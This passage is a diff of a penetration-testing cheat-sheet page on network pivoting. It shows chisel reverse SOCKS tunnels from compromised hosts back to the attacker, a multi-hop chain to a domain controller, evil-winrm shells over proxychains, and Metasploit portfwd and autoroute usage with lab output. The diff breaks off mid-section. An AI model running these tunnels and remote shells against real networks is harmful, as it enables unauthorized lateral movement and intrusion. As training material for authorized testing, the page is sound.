@@ -332,45 +332,258 @@ body.dark-mode #dynamicFormContainer button:hover {
     background: #424242;
 }
 </style>
-  <h3 id="tunneling">Tunneling</h3>
-<p>
-<button data-tabset="set1" data-tabcontent="tab1" class="active">Chisel</button>
+  <p>
+<button data-tabset="set1" data-tabcontent="tab1" >chisel</button>
 
-<button data-tabset="set1" data-tabcontent="tab2" >ssh</button>
+<button data-tabset="set1" data-tabcontent="tab2" >metasploit</button>
 
-<button data-tabset="set1" data-tabcontent="tab3" >socat</button>
+<button data-tabset="set1" data-tabcontent="tab3" >ssh</button>
 
-<button data-tabset="set1" data-tabcontent="tab4" >metasploit</button>
+<button data-tabset="set1" data-tabcontent="tab4" >socat</button>
 
 <button data-tabset="set1" data-tabcontent="tab5" >sliver</button>
 
-<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="start-a-local-chisel-server">Start a local chisel Server</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> In our <span class="nb">local</span> Linux machine
-</span></span><span class="line"><span class="cl"><span class="go">./chisel server --reverse --port &lt;LOCAL_PORT&gt;
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h3 id="basic">Basic</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Start a <span class="nb">local</span> chisel Server
+</span></span><span class="line"><span class="cl"><span class="go">./chisel server --reverse --port 8000
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> ./chisel server --reverse --port <span class="m">8000</span> 
 </span></span><span class="line"><span class="cl"><span class="go">2024/09/23 12:27:03 server: Reverse tunnelling enabled
 </span></span></span><span class="line"><span class="cl"><span class="go">2024/09/23 12:27:03 server: Fingerprint ikFn6iQOOodxIlcDQI4dvFu1pdHgV5UnHRenxUg0eho=
 </span></span></span><span class="line"><span class="cl"><span class="go">2024/09/23 12:27:03 server: Listening on http://0.0.0.0:8000
 </span></span></span></code></pre></div><h4 id="ports-forwarding">Ports forwarding</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> In target machine
-</span></span><span class="line"><span class="cl"><span class="go">./chisel client &lt;LOCAL_IP&gt;:&lt;LOCAL_PORT&gt; R:&lt;TARGET_PORT&gt;:127.0.0.1:&lt;TARGET_PORT&gt;
+</span></span><span class="line"><span class="cl"><span class="go">./chisel client &lt;LOCAL_IP&gt;:8000 R:&lt;TARGET_PORT&gt;:127.0.0.1:&lt;TARGET_PORT&gt;
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Mutiple ports fowarding, can be different targets in the same subnet
-</span></span><span class="line"><span class="cl"><span class="go">./chisel client &lt;LOCAL_IP&gt;:&lt;LOCAL_PORT&gt; R:8080:172.17.0.2:8080 R:5000:172.17.0.3:5000
+</span></span><span class="line"><span class="cl"><span class="go">./chisel client &lt;LOCAL_IP&gt;:8000 R:8080:172.17.0.2:8080 R:5000:172.17.0.3:5000
 </span></span></span></code></pre></div><h4 id="socks5">Socks5</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> In target machine
+</span></span><span class="line"><span class="cl"><span class="go">./chisel client &lt;LOCAL_IP&gt;:8000 R:1081:socks
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> ./chisel client 10.10.14.31:8000 R:1081:socks
+</span></span><span class="line"><span class="cl"><span class="go">2024/09/23 04:16:44 client: Connecting to ws://10.10.14.31:8000
+</span></span></span><span class="line"><span class="cl"><span class="go">2024/09/23 04:16:44 client: Connected (Latency 47.945673ms)
+</span></span></span></code></pre></div><br>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> In our <span class="nb">local</span> Linux machine
 </span></span><span class="line"><span class="cl"><span class="go">sudo nano /etc/proxychains4.conf
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Add to the end of the file
 </span></span><span class="line"><span class="cl"><span class="go">socks5 127.0.0.1 1081
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> In target machine
-</span></span><span class="line"><span class="cl"><span class="go">./chisel client &lt;LOCAL_IP&gt;:&lt;LOCAL_PORT&gt; R:1081:socks
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> ./chisel client 10.10.14.31:8000 R:1081:socks
-</span></span><span class="line"><span class="cl"><span class="go">2024/09/23 04:16:44 client: Connecting to ws://10.10.14.31:8000
-</span></span></span><span class="line"><span class="cl"><span class="go">2024/09/23 04:16:44 client: Connected (Latency 47.945673ms)
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Usage, in our <span class="nb">local</span> machine
-</span></span><span class="line"><span class="cl"><span class="go">proxychains4 curl http://127.0.0.1:1081
-</span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/jpillora/chisel">chisel</a></em></small></p></div>
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Example, in our <span class="nb">local</span> machine
+</span></span><span class="line"><span class="cl"><span class="go">proxychains4 curl http://172.16.1.100:1081
+</span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/jpillora/chisel">chisel</a></em></small></p>
+<h3 id="multiple-subnets">Multiple subnets</h3>
+<h4 id="1-local-kali">1. Local Kali</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">./chisel server --reverse --socks5 --port 8000
+</span></span></span></code></pre></div><h4 id="2-hop-1">2. Hop 1</h4>
+<p><button data-tabset="set1-1-1" data-tabcontent="tab1" class="active">Linux</button>
+<button data-tabset="set1-1-1" data-tabcontent="tab2" >Windows</button></p>
+<div class="tabcontent" data-tabset="set1-1-1" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Start a client
+</span></span><span class="line"><span class="cl"><span class="go">./chisel client &lt;LOCAL_IP&gt;:8000 R:1081:socks &amp;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Start a server
+</span></span><span class="line"><span class="cl"><span class="go">./chisel server --reverse --socks5 --port 8001 &amp;
+</span></span></span></code></pre></div></div>
+<div class="tabcontent" data-tabset="set1-1-1" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Start a client
+</span></span><span class="line"><span class="cl"><span class="go">Start-Job -ScriptBlock { C:\ProgramData\chisel.exe client &lt;LOCAL_IP&gt;:8000 R:1081:socks }
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Start a server
+</span></span><span class="line"><span class="cl"><span class="go">Start-Job -ScriptBlock { C:\ProgramData\chisel.exe server --reverse --socks5 --port 8001 }
+</span></span></span></code></pre></div></div>
+<br>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> In our <span class="nb">local</span> Linux machine
+</span></span><span class="line"><span class="cl"><span class="go">sudo nano /etc/proxychains4.conf
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Add to the end of the file
+</span></span><span class="line"><span class="cl"><span class="go">socks5 127.0.0.1 1081
+</span></span></span></code></pre></div><h4 id="3-hop-2">3. Hop 2</h4>
+<p><button data-tabset="set1-1-2" data-tabcontent="tab1" class="active">Linux</button>
+<button data-tabset="set1-1-2" data-tabcontent="tab2" >Windows</button></p>
+<div class="tabcontent" data-tabset="set1-1-2" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Start a client
+</span></span><span class="line"><span class="cl"><span class="go">./chisel client &lt;HOP_1_IP&gt;:8001 R:1082:socks &amp;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Start a server
+</span></span><span class="line"><span class="cl"><span class="go">./chisel server --reverse --socks5 --port 8002 &amp;
+</span></span></span></code></pre></div></div>
+<div class="tabcontent" data-tabset="set1-1-2" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Start a client
+</span></span><span class="line"><span class="cl"><span class="go">Start-Job -ScriptBlock { C:\ProgramData\chisel.exe client &lt;HOP_1_IP&gt;:8001 R:1082:socks }
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Start a server
+</span></span><span class="line"><span class="cl"><span class="go">Start-Job -ScriptBlock { C:\ProgramData\chisel.exe server --reverse --socks5 --port 8002 }
+</span></span></span></code></pre></div></div>
+<br>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> In our <span class="nb">local</span> Linux machine
+</span></span><span class="line"><span class="cl"><span class="go">sudo nano /etc/proxychains4.conf
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Add to the end of the file
+</span></span><span class="line"><span class="cl"><span class="go">socks5 127.0.0.1 1082
+</span></span></span></code></pre></div><h4 id="4-hop-3">4. Hop 3</h4>
+<p><button data-tabset="set1-1-3" data-tabcontent="tab1" class="active">Linux</button>
+<button data-tabset="set1-1-3" data-tabcontent="tab2" >Windows</button></p>
+<div class="tabcontent" data-tabset="set1-1-3" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Start a client
+</span></span><span class="line"><span class="cl"><span class="go">./chisel client &lt;HOP_2_IP&gt;:8002 R:1083:socks &amp;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Start a server
+</span></span><span class="line"><span class="cl"><span class="go">./chisel server --reverse --socks5 --port 8003 &amp;
+</span></span></span></code></pre></div></div>
+<div class="tabcontent" data-tabset="set1-1-3" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Start a client
+</span></span><span class="line"><span class="cl"><span class="go">Start-Job -ScriptBlock { C:\ProgramData\chisel.exe client &lt;HOP_2_IP&gt;:8002 R:1083:socks }
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Start a server
+</span></span><span class="line"><span class="cl"><span class="go">Start-Job -ScriptBlock { C:\ProgramData\chisel.exe server --reverse --socks5 --port 8003 }
+</span></span></span></code></pre></div></div>
+<br>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> In our <span class="nb">local</span> Linux machine
+</span></span><span class="line"><span class="cl"><span class="go">sudo nano /etc/proxychains4.conf
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Add to the end of the file
+</span></span><span class="line"><span class="cl"><span class="go">socks5 127.0.0.1 1083
+</span></span></span></code></pre></div><p><small><em>Note: Follow the same pattern for more layers</em></small></p>
+<h4 id="example">Example</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go"> Local Kali         WEB01 LINUX            DC01 Windows          DC02 Windows &lt;-- TARGET
+</span></span></span><span class="line"><span class="cl"><span class="go">+------------+     +---------------+     +---------------+     +---------------+
+</span></span></span><span class="line"><span class="cl"><span class="go">| 10.10.14.1 |     | 10.10.110.100 |     | 172.16.1.20   |     | 172.16.2.5    |
+</span></span></span><span class="line"><span class="cl"><span class="go">|            | --&gt; |               | --&gt; |               | --&gt; |               |
+</span></span></span><span class="line"><span class="cl"><span class="go">|            |     | 172.16.1.100  |     | 172.16.2.20   |     |               |
+</span></span></span><span class="line"><span class="cl"><span class="go">+------------+     +---------------+     +---------------+     +---------------+
+</span></span></span></code></pre></div><h4 id="1-local-kali-1">1. Local Kali</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">./chisel server --reverse --socks5 --port 8000
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> ./chisel server --reverse --socks5 --port <span class="m">8000</span>
+</span></span><span class="line"><span class="cl"><span class="go">2024/09/29 14:25:33 server: Reverse tunnelling enabled
+</span></span></span><span class="line"><span class="cl"><span class="go">2024/09/29 14:25:33 server: Fingerprint QFsVZapiOv/hBAKLzj+645y42Sra4IV/Le7G/wgZ4/Y=
+</span></span></span><span class="line"><span class="cl"><span class="go">2024/09/29 14:25:33 server: Listening on http://0.0.0.0:8000
+</span></span></span><span class="line"><span class="cl"><span class="go">2024/09/29 14:25:40 server: session#1: tun: proxy#R:127.0.0.1:1081=&gt;socks: Listening
+</span></span></span></code></pre></div><h4 id="2-web01-linux-gateway-1">2. WEB01 Linux (Gateway 1)</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Start a client
+</span></span><span class="line"><span class="cl"><span class="go">./chisel client 10.10.14.1:8000 R:1081:socks &amp;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">root@WEB01:/dev/shm# ./chisel client 10.10.14.1:8000 R:1081:socks
+</span></span></span><span class="line"><span class="cl"><span class="go">2024/09/28 23:31:23 client: Connecting to ws://10.10.14.1:8000
+</span></span></span><span class="line"><span class="cl"><span class="go">2024/09/28 23:31:26 client: Connected (Latency 312.250392ms)
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Start a server
+</span></span><span class="line"><span class="cl"><span class="go">./chisel server --reverse --socks5 --port 8001 &amp;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">root@WEB01:/dev/shm# ./chisel server --reverse --socks5 --port 8001
+</span></span></span><span class="line"><span class="cl"><span class="go">2024/09/28 22:54:18 server: Fingerprint BsVmahG6oWbFa26XG4DC8tPiL9nFq2zF3N8jUG5Edwk=
+</span></span></span><span class="line"><span class="cl"><span class="go">2024/09/28 22:54:18 server: Listening on http://0.0.0.0:8001
+</span></span></span><span class="line"><span class="cl"><span class="go">2024/09/28 22:56:07 server: session#1: tun: proxy#R:127.0.0.1:1082=&gt;socks: Listening
+</span></span></span></code></pre></div><h4 id="3-dc01-windows-gateway-2">3. DC01 Windows (Gateway 2)</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> In our <span class="nb">local</span> Linux machine
+</span></span><span class="line"><span class="cl"><span class="go">sudo nano /etc/proxychains4.conf
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Add to the end of the file
+</span></span><span class="line"><span class="cl"><span class="go">socks5 127.0.0.1 1081
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">proxychains4 evil-winrm -i 172.16.1.20 -u user -p password
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> proxychains4  evil-winrm -i 172.16.1.20 -u user -p password
+</span></span><span class="line"><span class="cl"><span class="go">Evil-WinRM shell v3.5
+</span></span></span><span class="line"><span class="cl"><span class="go">                                        
+</span></span></span><span class="line"><span class="cl"><span class="go">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+</span></span></span><span class="line"><span class="cl"><span class="go">                                        
+</span></span></span><span class="line"><span class="cl"><span class="go">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span></span><span class="line"><span class="cl"><span class="go">                                        
+</span></span></span><span class="line"><span class="cl"><span class="go">Info: Establishing connection to remote endpoint
+</span></span></span><span class="line"><span class="cl"><span class="go">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  172.16.1.20:5985  ...  OK
+</span></span></span><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\user\Documents&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\chisel.exe client 172.16.1.100:8001 R:1082:socks
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\user\Documents&gt;.\chisel.exe client 172.16.1.100:8001 R:1082:socks             
+</span></span></span><span class="line"><span class="cl"><span class="go">2024/09/29 07:41:35 client: Connecting to ws://172.16.1.100:8001                                        
+</span></span></span><span class="line"><span class="cl"><span class="go">2024/09/29 07:41:35 client: Connected (Latency 0s)
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Or run in background
+</span></span><span class="line"><span class="cl"><span class="go">Start-Job -ScriptBlock { C:\ProgramData\chisel.exe client 172.16.1.100:8001 R:1082:socks }
+</span></span></span></code></pre></div><h4 id="4-local-kali">4. Local Kali</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> In our <span class="nb">local</span> Linux machine
+</span></span><span class="line"><span class="cl"><span class="go">sudo nano /etc/proxychains4.conf
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Add to the end of the file
+</span></span><span class="line"><span class="cl"><span class="go">socks5 127.0.0.1 1082
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">proxychains4 evil-winrm -i 172.16.2.5 -u user -p password
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> proxychains4 evil-winrm -i 172.16.2.5 -u user -p password                                        
+</span></span><span class="line"><span class="cl"><span class="go">Evil-WinRM shell v3.5
+</span></span></span><span class="line"><span class="cl"><span class="go">                                        
+</span></span></span><span class="line"><span class="cl"><span class="go">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+</span></span></span><span class="line"><span class="cl"><span class="go">                                        
+</span></span></span><span class="line"><span class="cl"><span class="go">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span></span><span class="line"><span class="cl"><span class="go">                                        
+</span></span></span><span class="line"><span class="cl"><span class="go">Info: Establishing connection to remote endpoint
+</span></span></span><span class="line"><span class="cl"><span class="go">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  127.0.0.1:1082  ...  172.16.2.5:5985  ...  OK
+</span></span></span><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\user\Documents&gt; 
+</span></span></span></code></pre></div><p><small><em>Note: Edit /etc/proxychains4.conf accordingly, depends on which layer you are accessing</em></small></p>
+</div>
 
-<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> SSH port forwarding without spawning a shell
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><h4 id="ports-forwarding">Ports forwarding</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Add
+</span></span><span class="line"><span class="cl"><span class="go">portfwd add -l &lt;TARGET_PORT&gt; -r &lt;TARGET&gt; -p &lt;TARGET_PORT&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">meterpreter &gt; portfwd add -l 88 -r 172.16.2.5 -p 88
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Forward TCP relay created: (local) :88 -&gt; (remote) 172.16.2.5:88
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Delete
+</span></span><span class="line"><span class="cl"><span class="go">portfwd delete -l &lt;TARGET_PORT&gt; -r &lt;TARGET&gt; -p &lt;TARGET_PORT&gt;
+</span></span></span></code></pre></div><h4 id="add-routes">Add routes</h4>
+<p><button data-tabset="set1-2-1" data-tabcontent="tab1" class="active">autoroute</button>
+<button data-tabset="set1-2-1" data-tabcontent="tab2" >route</button></p>
+<div class="tabcontent" data-tabset="set1-2-1" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Enter target session
+</span></span><span class="line"><span class="cl"><span class="go">sessions &lt;SESSION_ID&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msf6 post(multi/manage/autoroute) &gt; sessions 1
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Starting interaction with 1...
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Return from meterpreter
+</span></span><span class="line"><span class="cl"><span class="go">background
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">meterpreter &gt; background
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Backgrounding session 1...
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">use post/multi/manage/autoroute
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msf6 exploit(multi/handler) &gt; use post/multi/manage/autoroute
+</span></span></span><span class="line"><span class="cl"><span class="go">msf6 post(multi/manage/autoroute) &gt; 
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">set session &lt;SESSION_ID&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msf6 post(multi/manage/autoroute) &gt; set session 1
+</span></span></span><span class="line"><span class="cl"><span class="go">session =&gt; 1
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Manual add <span class="o">[</span>optional<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="go">set cmd add
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msf6 post(multi/manage/autoroute) &gt; set cmd add
+</span></span></span><span class="line"><span class="cl"><span class="go">cmd =&gt; add
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Manual <span class="nb">set</span> subnet <span class="o">[</span>optional<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="go">set subnet &lt;SUBNET&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msf6 post(multi/manage/autoroute) &gt; set subnet 172.16.1.0
+</span></span></span><span class="line"><span class="cl"><span class="go">subnet =&gt; 172.16.1.0
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Manual <span class="nb">set</span> mask <span class="o">[</span>optional<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="go">set netmask &lt;MASK&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msf6 post(multi/manage/autoroute) &gt; set netmask 255.255.255.0
+</span></span></span><span class="line"><span class="cl"><span class="go">netmask =&gt; 255.255.255.0
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">run
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msf6 post(multi/manage/autoroute) &gt; run
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Running module against 172.16.1.100
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Searching for subnets to autoroute.
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Route added to subnet 172.16.1.0/255.255.255.0 from host&#39;s routing table.
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Post module execution completed
+</span></span></span></code></pre></div></div>
+<div class="tabcontent" data-tabset="set1-2-1" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Manual add route
+</span></span><span class="line"><span class="cl"><span class="go">route add &lt;SUBNET&gt; &lt;MASK&gt; &lt;SESSION_ID&gt;
+</span></span></span></code></pre></div></div>
+<br>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
+</span></span><span class="line"><span class="cl"><span class="go">route
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msf6 post(multi/manage/autoroute) &gt; route
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">IPv4 Active Routing Table
+</span></span></span><span class="line"><span class="cl"><span class="go">=========================
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">   Subnet             Netmask            Gateway
+</span></span></span><span class="line"><span class="cl"><span class="go">   ------             -------            -------
+</span></span></span><span class="line"><span class="cl"><span class="go">   172.16.1.0         255.255.255.0      Session 2
+</span></span></span><span class="line"><span class="cl"><span class="go">   172.16.2.0         255.255.255.0      Session 1
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check route to target
+</span></span><span class="line"><span class="cl"><span class="go">route get &lt;TARGET&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msf6 auxiliary(server/socks_proxy) &gt; route get 172.16.2.1
+</span></span></span><span class="line"><span class="cl"><span class="go">172.16.2.1 routes through: Session 1
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Remove route
+</span></span><span class="line"><span class="cl"><span class="go">route remove &lt;SUBNET&gt;/&lt;MASK&gt; &lt;SESSION_ID&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Remove all routes
